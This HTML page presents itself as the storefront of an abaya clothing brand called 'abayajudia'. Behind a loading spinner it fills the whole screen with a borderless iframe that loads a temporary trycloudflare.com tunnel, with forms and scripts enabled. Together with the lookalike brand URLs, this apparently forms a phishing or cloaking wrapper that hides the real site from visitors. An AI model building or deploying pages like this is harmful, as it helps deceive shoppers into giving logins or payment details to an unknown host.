<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>abayajudia</title>
    <meta property="og:title" content="abayajudia">
    <meta property="og:description" content="باعتبارنا علامة تجارية متخصصة في العبايات فإننا نقدم مجموعة متنوعة من المنتجات بما في ذلك العبايات والتنانير والبلوزات والسترات وكل ما تحتاجه.">
    <meta property="og:image" content="https://abayajudi.com/wp-content/uploads/2024/09/SAVE_20260513_190924.jpg">
    <meta property="og:url" content="https://abayajudia.new-collection/">
    <meta property="og:type" content="website">
    
    <style>
        /* إيقاف أي تفاعل للـ body لمنع الازدواجية */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #ffffff;
            font-family: Tahoma, sans-serif;
            position: fixed;
        }
        
        /* شاشة التحميل */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.3s ease;
        }

        .spinner {
            width: 45px;
            height: 45px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #111;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .brand-loading {
            font-size: 18px;
            font-weight: bold;
            color: #222;
            letter-spacing: 1px;
        }

        /* تحجيم الـ iframe بدقة مطلقة ومنع أي تداخل بصري */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            background: #ffffff;
        }
    </style>
</head>
<body>

    <div id="loader">
        <div class="spinner"></div>
        <div class="brand-loading">abayajudia</div>
    </div>

    <!-- الـ Iframe -->
    <iframe 
        id="contentFrame"
        src="https://dodge-bidder-watching-television.trycloudflare.com" 
        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-presentation"
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
        onload="hideLoader()">
    </iframe>

    <script>
        function hideLoader() {
            const loader = document.getElementById('loader');
            loader.style.opacity = '0';
            setTimeout(() => {
                loader.style.display = 'none';
            }, 300);
        }

        setTimeout(function() {
            const loader = document.getElementById('loader');
            if (loader && loader.style.display !== 'none') {
                hideLoader();
            }
        }, 5000);
    </script>

</body>
</html>
